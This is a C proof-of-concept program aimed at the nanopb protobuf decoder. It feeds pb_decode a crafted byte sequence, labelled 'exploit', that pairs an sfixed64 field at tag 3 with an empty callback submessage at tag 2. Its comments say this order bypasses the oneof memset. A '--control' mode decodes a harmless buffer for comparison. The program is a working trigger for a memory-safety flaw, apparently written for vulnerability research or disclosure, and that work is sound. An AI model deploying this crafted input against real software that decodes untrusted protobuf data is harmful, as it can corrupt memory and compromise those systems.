#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <nanopb/pb_decode.h>
#include "variant.pb.h"
int main(int argc,char**argv){
  int control = (argc>1 && strcmp(argv[1],"--control")==0);
  /* tag 3 = sfixed64 (STATIC, NOT a submsg -> the ONEOF memset does not run),
     then tag 2 = SubMsg1 as FT_CALLBACK.                                     */
  static const uint8_t exploit[] = {
    0x19, 0x41,0x41,0x41,0x41, 0x00,0x00,0x00,0x00,  /* i = 0x0000000041414141 */
    0x12, 0x00                                        /* s = {} (empty submsg) */
  };
  static const uint8_t ctrl[] = { 0x12, 0x00 };       /* s = {} only            */
  const uint8_t *b = control?ctrl:exploit; size_t n = control?sizeof ctrl:sizeof exploit;
  printf("[poc] nanopb %s\n[poc] mode=%s\n[poc] wire:", NANOPB_VERSION, control?"CONTROL (no sibling tag 3)":"EXPLOIT");
  size_t i;
  for(i=0;i<n;i++)printf(" %02x", b[i]);
  printf("\n");
  VariantMessage msg = VariantMessage_init_zero;
  pb_decode_ctx_t is;
  pb_init_decode_ctx_for_buffer(&is, b, n);
  printf("[poc] calling pb_decode()...\n"); fflush(stdout);
  bool ok = pb_decode(&is, VariantMessage_fields, &msg);
  printf("[poc] pb_decode -> %d (%s) which_value=%d\n", ok, ok?"ok":PB_GET_ERROR(&is), (int)msg.which_value);
  printf("[poc] clean exit\n"); return 0;
}
